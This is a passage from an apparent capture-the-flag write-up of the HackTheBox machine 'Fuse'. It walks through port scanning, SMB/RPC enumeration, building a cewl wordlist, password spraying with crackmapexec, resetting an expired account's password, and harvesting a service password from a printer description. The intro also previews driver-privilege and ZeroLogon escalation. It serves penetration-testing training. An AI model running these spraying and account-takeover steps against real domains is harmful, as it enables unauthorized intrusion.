@@ -1,0 +1,1240 @@
+I"'�<blockquote>
+  <p>Fuse is based on Printers in corporate environment making it quite realistic machine, We’ll complete it using both Intended and Unintended method. We start off with web enumeration of a printer page, collecting potential usernames from several print job logs the use cewl to create a password wordlist. Using this data we initiate a Password Spray attack where we discover users with expired password then change the password of a account, use it to access rpcclient where we discover a password inside printer description. Using this password we get WinRM access of a printer service account with SeLoadDriverPrivilege enabled which allows the user to load kernel drivers. For abusing this privilege we’ll make use of infamous Capcom driver to load a payload which creates a local administrator account and access it via WinRM. In Unintended method we’ll exploit ZeroLogon (CVE-2020-1472) to dump Admin NT hash.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<h4 id="masscan">masscan</h4>
+
+<p>Starting with <code class="language-plaintext highlighter-rouge">masscan</code> for a full TCP &amp; UDP port scan:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span>,U:1-65535 <span class="nt">--rate</span> 500 10.10.10.193 | <span class="nb">tee </span>masscan.allports
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-11-01 07:48:28 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>131070 ports/host]
+Discovered open port 3268/tcp on 10.10.10.193
+Discovered open port 5985/tcp on 10.10.10.193
+Discovered open port 135/tcp on 10.10.10.193
+Discovered open port 49667/tcp on 10.10.10.193
+Discovered open port 49679/tcp on 10.10.10.193
+Discovered open port 49676/tcp on 10.10.10.193
+Discovered open port 53/tcp on 10.10.10.193
+Discovered open port 9389/tcp on 10.10.10.193
+Discovered open port 80/tcp on 10.10.10.193
+Discovered open port 464/tcp on 10.10.10.193
+Discovered open port 49753/tcp on 10.10.10.193
+Discovered open port 88/tcp on 10.10.10.193
+Discovered open port 445/tcp on 10.10.10.193
+Discovered open port 49675/tcp on 10.10.10.193
+Discovered open port 636/tcp on 10.10.10.193
+Discovered open port 49666/tcp on 10.10.10.193
+Discovered open port 3269/tcp on 10.10.10.193
+Discovered open port 49695/tcp on 10.10.10.193
+Discovered open port 593/tcp on 10.10.10.193
+Discovered open port 53/udp on 10.10.10.193
+Discovered open port 139/tcp on 10.10.10.193
+Discovered open port 389/tcp on 10.10.10.193
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>masscan discovered twenty one ports, let’s format them using <code class="language-plaintext highlighter-rouge">awk</code> and <code class="language-plaintext highlighter-rouge">sed</code> for nmap:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ <span class="nb">cat </span>masscan.allports | <span class="nb">sed </span>s/<span class="s1">'Discovered open port //'</span> | <span class="nb">awk</span> <span class="nt">-F</span>/ <span class="s1">'{print $1}'</span> | <span class="nb">awk</span> <span class="s1">'!seen[$0]++'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">','</span>
+3268,5985,135,49667,49679,49676,53,9389,80,464,49753,88,445,49675,636,49666,3269,49695,593,139,389,
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="nmap">nmap</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p3268</span>,5985,135,49667,49679,49676,53,9389,80,464,49753,88,445,49675,636,49666,3269,49695,593,139,389 10.10.10.193
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-01 13:40 IST
+Nmap scan report <span class="k">for </span>10.10.10.193
+Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-11-01 08:25:23Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc        Microsoft Windows RPC
+49679/tcp open  msrpc        Microsoft Windows RPC
+49695/tcp open  msrpc        Microsoft Windows RPC
+49753/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h34m20s, deviation: 4h02m31s, median: 14m18s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE\x00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System time: 2020-11-01T01:26:18-07:00
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-11-01T08:26:17
+|_  start_date: 2020-11-01T07:07:26
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 107.13 seconds
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Ton’s of open ports &amp; services, looks like we have a domain controller in play.</p>
+
+<p>Port Scanning Summary:</p>
+
+<ul>
+  <li>Port 53: DNS</li>
+  <li>Port 80: HTTP Service on Microsoft-IIS/10.0</li>
+  <li>Port 88: kerberos-sec - Active Directory authentication protocol</li>
+  <li>Port 135,593: - Windows RPC &amp; RPC over HTTP 1.0</li>
+  <li>Port 445: SMB</li>
+  <li>Port 389,3268,3269: LDAP &amp; LDAP GC</li>
+  <li>Port 636: LDAPS</li>
+  <li>Port 464: kpasswd5 (Kerberos Change/Set password )</li>
+  <li>Port 9389: .NET Remoting Services</li>
+  <li>Port 5985: WinRM</li>
+  <li>Port 49666,49667,49675,49676,49679,49695,49754 - Other Windows RPC ports</li>
+</ul>
+
+<p>Important Notes from Nmap results:</p>
+
+<ul>
+  <li>Netbios name: FUSE</li>
+  <li>Domain name: fabricorp.local</li>
+  <li>OS: Windows Server 2016 Standard 14393</li>
+</ul>
+
+<h3 id="port-445--smb">Port 445 : SMB</h3>
+
+<p>Although we got the Domain and OS details from nmap results, but it’s always good to try different tools to confirm the results and what’s better than <a href="https://github.com/byt3bl33d3r/CrackMapExec"><strong>CrackMapExec</strong></a> :</p>
+
+<h4 id="crackmapexec">CrackMapExec</h4>
+
+<p>We can confirm the results are matching:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ cme smb 10.10.10.193
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FUSE<span class="o">)</span> <span class="o">(</span>domain:fabricorp.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h4 id="smb-enumeration">SMB Enumeration</h4>
+
+<p><code class="language-plaintext highlighter-rouge">crackmapexec</code> confirms null session is not allowed:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ cme smb 10.10.10.193 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FUSE<span class="o">)</span> <span class="o">(</span>domain:fabricorp.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\:</span> STATUS_ACCESS_DENIED
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="port-135--rpc">Port 135 : RPC</h3>
+
+<h4 id="rpc-enumeration">RPC Enumeration</h4>
+
+<p>Using null session we can connect to <code class="language-plaintext highlighter-rouge">rpcclient</code> but unfortunately it’s of no use as we are not authorized to access anything:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ rpcclient 10.10.10.193 <span class="nt">-U</span> <span class="s1">''</span>
+Enter WORKGROUP<span class="se">\'</span>s password:
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="port-80---http-service">Port 80 - HTTP Service</h3>
+
+<h4 id="fusefabricorplocal">fuse.fabricorp.local</h4>
+
+<p>Visiting <a href="http://10.10.10.193">http://10.10.10.193</a> we get redirected to <a href="http://fuse.fabricorp.local/papercut/logs/html/index.htm">http://fuse.fabricorp.local/papercut/logs/html/index.htm</a></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ curl http://10.10.10.193
+&lt;meta http-equiv<span class="o">=</span><span class="s2">"refresh"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0; url=http://fuse.fabricorp.local/papercut/logs/html/index.htm"</span> /&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Let’s add the Domain and Subdomain to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ <span class="nb">cat</span> /etc/hosts | <span class="nb">grep </span>fabricorp
+10.10.10.193    fabricorp.local fuse.fabricorp.local
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Looking at the site, It appears the host is running Paper Cut Print logger application.</p>
+
+<blockquote>
+  <p>PaperCut Print Logger is a free print logging application for Windows systems designed to provider real-time activity tracking and listing of all printer use. The print log contains; time of print, the name of the user who printed, the total number of pages, document names and titles, other job attributes such as paper size, color mode. Print logs are available in a viewer friendly HTML format, or in CSV or Excel format for advanced users needing the data for further analysis.</p>
+</blockquote>
+
+<p><img src="/assets/img/Posts/Fuse/website.png" alt="website" /></p>
+
+<p>Going through each of the Print logs, we can gather potential usernames :</p>
+
+<p><img src="/assets/img/Posts/Fuse/log.png" alt="log" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ <span class="nb">cat </span>users.txt
+pmerton
+tlavel
+sthompson
+bhult
+administrator
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="credential-hunting">Credential Hunting</h2>
+
+<p>Since, We didn’t obtain anything useful out of SMB and RPC enumeration, we don’t have much options to go ahead. But we do have potential list of usernames on the machine via Print logs, that gives us an option to try password spraying.</p>
+
+<h3 id="password-spraying">Password Spraying</h3>
+
+<p>We’ll make a wordlist using <code class="language-plaintext highlighter-rouge">cewl</code> along with <code class="language-plaintext highlighter-rouge">--with-numbers</code> flag which helps for creating wordlist contains numbers and try to spray it against SMB, maybe we’ll get lucky:</p>
+
+<h4 id="wordlist">Wordlist</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm <span class="nt">--with-numbers</span> <span class="o">&gt;</span> dict.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>After removing cewl banner from the list we have 169 words in our wordlist:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ <span class="nb">wc</span> <span class="nt">-l</span> dict.txt
+169 dict.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="brute-force">Brute force</h3>
+
+<p>We’ll use crackmapexec to brute force, I’ll also include <code class="language-plaintext highlighter-rouge">--continue-on-success</code> flag which will keep running the brute force even after a successful login.</p>
+
+<p>Since, we get multiple failed attempt results as well, We will use <code class="language-plaintext highlighter-rouge">grep</code> to exclude anything with <code class="language-plaintext highlighter-rouge">FAILURE</code> in the result:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ cme smb 10.10.10.193 <span class="nt">-u</span> users.txt <span class="nt">-p</span> dict.txt <span class="nt">--continue-on-success</span> | <span class="nb">grep</span> <span class="nt">-v</span> FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FUSE<span class="o">)</span> <span class="o">(</span>domain:fabricorp.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\t</span>lavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\b</span>hult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Interesting as we got Two users with <code class="language-plaintext highlighter-rouge">STATUS_PASSWORD_MUST_CHANGE</code>, both having same password. It seems each user was assigned default password and later had to change it.</p>
+
+<h3 id="password-changing">Password Changing</h3>
+
+<p>We’ll target use <code class="language-plaintext highlighter-rouge">bhult</code>, For changing the password we can use <code class="language-plaintext highlighter-rouge">smbpasswd</code> tool, It seems even after we reset the password, the box reverts it to default password every minute (I guess!). So we need to be bit quick :</p>
+
+<p>There is some password criteria as well and if it doesn’t meet, we get the following error:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ smbpasswd <span class="nt">-r</span> 10.10.10.193 <span class="nt">-U</span> bhult
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+machine 10.10.10.193 rejected the password change: Error was : When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria..
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>So I’ll change the password to <code class="language-plaintext highlighter-rouge">ColdFusi0nX</code> as it meets most the usual password criteria’s.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ smbpasswd <span class="nt">-r</span> 10.10.10.193 <span class="nt">-U</span> bhult
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed <span class="k">for </span>user bhult on 10.10.10.193.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="shell-as-svc-print">Shell as svc-print</h2>
+
+<h3 id="smb---bhult">SMB - bhult</h3>
+
+<p>Using new creds we are able to list SMB shares.</p>
+
+<p>As user <code class="language-plaintext highlighter-rouge">bhult</code> we have READ permission on <code class="language-plaintext highlighter-rouge">print$</code> share, I tried connecting to it but didn’t find anything interesting.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ cme smb 10.10.10.193 <span class="nt">-u</span> bhult <span class="nt">-p</span> <span class="s1">'ColdFusi0nX'</span> <span class="nt">--shares</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FUSE<span class="o">)</span> <span class="o">(</span>domain:fabricorp.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>+] fabricorp.local<span class="se">\b</span>hult:ColdFusi0nX
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>+] Enumerated shares
+SMB         10.10.10.193    445    FUSE             Share           Permissions     Remark
+SMB         10.10.10.193    445    FUSE             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.10.193    445    FUSE             ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.10.193    445    FUSE             C<span class="nv">$ </span>                             Default share
+SMB         10.10.10.193    445    FUSE             HP-MFT01                        HP-MFT01
+SMB         10.10.10.193    445    FUSE             IPC<span class="nv">$ </span>                           Remote IPC
+SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share
+SMB         10.10.10.193    445    FUSE             print<span class="nv">$ </span>         READ            Printer Drivers
+SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="rpc---bhult">RPC - bhult</h3>
+
+<p>Next, we will hop on to RPC :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ rpcclient <span class="nt">-U</span> bhult 10.10.10.193
+Enter WORKGROUP<span class="se">\b</span>hult<span class="s1">'s password:
+rpcclient $&gt;
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Let’s check the users on the box using <code class="language-plaintext highlighter-rouge">enumdomusers</code> :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td> --><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Seems there are more users than we observed in print logs.</p>
+
+<p>Also, Because of what we have seen so far, box has something to do with Printer. So let’s enumerate printers using <code class="language-plaintext highlighter-rouge">enumprinters</code> :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> enumprinters
+        flags:[0x800000]
+        name:[<span class="se">\\</span>10.10.10.193<span class="se">\H</span>P-MFT01]
+        description:[<span class="se">\\</span>10.10.10.193<span class="se">\H</span>P-MFT01,HP Universal Printing PCL 6,Central <span class="o">(</span>Near IT, scan2docs password: <span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span><span class="o">)]</span>
+        comment:[]
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>It appears we got a password <code class="language-plaintext highlighter-rouge">$fab@s3Rv1ce$1</code></p>
+
+<h3 id="username-hunt">Username Hunt</h3>
+
+<p>Let’s test this password against others users we got from RPC, I’ll copy the output of rpc, extract usernames and save it inside a new file:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ <span class="nb">cat </span>users_rpc.txt
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+
+cfx:  ~/Documents/htb/fuse
+→ <span class="nb">cat </span>users_rpc.txt | <span class="nb">awk</span> <span class="nt">-F</span><span class="o">]</span> <span class="s1">'{print $1}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="o">[</span> <span class="s1">'{print $2}'</span>
+Administrator
+Guest
+krbtgt
+DefaultAccount
+svc-print
+bnielson
+sthompson
+tlavel
+pmerton
+svc-scan
+bhult
+dandrews
+mberbatov
+astein
+dmuir
+
+cfx:  ~/Documents/htb/fuse
+→ <span class="nb">cat </span>users_rpc.txt | <span class="nb">awk</span> <span class="nt">-F</span><span class="o">]</span> <span class="s1">'{print $1}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="o">[</span> <span class="s1">'{print $2}'</span> <span class="o">&gt;</span> rpc_users.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now let’s run crackmapexec:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ cme smb 10.10.10.193 <span class="nt">-u</span> rpc_users.txt <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span> <span class="nt">--continue-on-success</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FUSE<span class="o">)</span> <span class="o">(</span>domain:fabricorp.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\A</span>dministrator:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\G</span>uest:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\k</span>rbtgt:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\D</span>efaultAccount:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>+] fabricorp.local<span class="se">\s</span>vc-print:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\b</span>nielson:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\s</span>thompson:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\t</span>lavel:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\p</span>merton:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>+] fabricorp.local<span class="se">\s</span>vc-scan:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\b</span>hult:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\d</span>andrews:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\m</span>berbatov:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\a</span>stein:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\d</span>muir:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> STATUS_LOGON_FAILURE
